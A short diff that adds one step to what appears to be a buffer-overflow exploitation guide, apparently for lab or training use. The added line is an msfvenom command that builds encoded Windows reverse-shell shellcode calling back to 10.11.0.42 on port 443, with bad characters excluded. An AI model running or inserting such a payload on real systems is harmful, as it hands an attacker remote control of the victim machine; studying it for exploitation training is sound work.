@@ -113,6 +113,8 @@ Choose one of the pointers -> copy its address -> click on "Go to address in Dis
 
 ### 7. GENERATE SHELLCODE
 
+Generate shellcode:
+`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.42 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai`
 
 ---
 
